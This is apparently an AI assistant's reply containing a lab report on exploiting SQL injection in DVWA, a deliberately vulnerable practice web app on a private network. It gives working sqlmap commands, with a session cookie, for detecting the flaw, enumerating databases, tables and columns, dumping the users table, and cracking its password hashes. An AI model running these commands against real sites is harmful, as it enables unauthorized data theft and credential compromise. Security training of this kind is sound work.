‚úÖ Here‚Äôs your SQLMap Lab Report in English ‚Äî clear, professional and ready to submit or document:

‚∏ª

üìù SQLMap Lab Report

1Ô∏è‚É£ Objective
	‚Ä¢	Understand the principle of SQL Injection (SQLi) vulnerabilities.
	‚Ä¢	Learn how to use the sqlmap tool to detect and exploit SQLi automatically.
	‚Ä¢	Retrieve database structure and sensitive data using sqlmap.

‚∏ª

2Ô∏è‚É£ Environment

Item	Configuration
Target system	DVWA (Damn Vulnerable Web App)
DVWA URL	http://192.168.50.109
DVWA Security Level	Low
sqlmap version	1.9.6 stable
Client OS	macOS
Others	Python 3, browser (to grab cookie)


‚∏ª

3Ô∏è‚É£ Procedure

3.1 Login to DVWA
	‚Ä¢	Open DVWA in browser and log in with valid credentials.
	‚Ä¢	Set DVWA Security Level to Low.
	‚Ä¢	Use browser developer tools to extract the session cookie:

PHPSESSID=20f7d9ebe3ccb2a863608def3b6106df; security=low



‚∏ª

3.2 Identify the Target URL

The vulnerable page tested:

http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit

Injection point: id parameter.

‚∏ª

3.3 Detect SQL Injection

Run sqlmap to detect whether id is injectable:

sqlmap -u "http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=20f7d9ebe3ccb2a863608def3b6106df; security=low" \
  --batch

‚úÖ Output:
	‚Ä¢	id parameter is vulnerable.
	‚Ä¢	Detected techniques: boolean-based blind, time-based blind.
	‚Ä¢	Backend DBMS: MySQL >= 5.0.12 (MariaDB fork).

‚∏ª

3.4 Enumerate Databases

sqlmap -u "http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=..." --batch --dbs

‚úÖ Output:

[*] dvwa
[*] information_schema


‚∏ª

3.5 Enumerate Tables

sqlmap -u "http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=..." --batch -D dvwa --tables

‚úÖ Output:

[*] guestbook
[*] users


‚∏ª

3.6 Enumerate Columns

sqlmap -u "http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=..." --batch -D dvwa -T users --columns

‚úÖ Output:

user_id, user, first_name, last_name, password, avatar, last_login, failed_login


‚∏ª

3.7 Dump Data

sqlmap -u "http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=..." --batch -D dvwa -T users --dump

‚úÖ Output:
	‚Ä¢	Retrieved all rows from dvwa.users.
	‚Ä¢	Automatically cracked MD5 password hashes.

user_id	user	password (plaintext)
1	admin	password
2	gordonb	abc123
3	1337	charley
4	pablo	letmein
5	smithy	password


‚∏ª

4Ô∏è‚É£ Conclusion

üéØ This experiment demonstrates how to:
	‚Ä¢	Detect SQL injection vulnerabilities using sqlmap.
	‚Ä¢	Bypass authentication using session cookies.
	‚Ä¢	Enumerate database names, tables, columns, and data.
	‚Ä¢	Crack common password hashes automatically with built-in dictionary attack.

sqlmap proved to be a powerful and efficient tool for SQL injection testing and exploitation.

‚∏ª

If you‚Äôd like, I can also write you a ready-to-use README.md version for your GitHub repo.
Just say the word! üöÄ
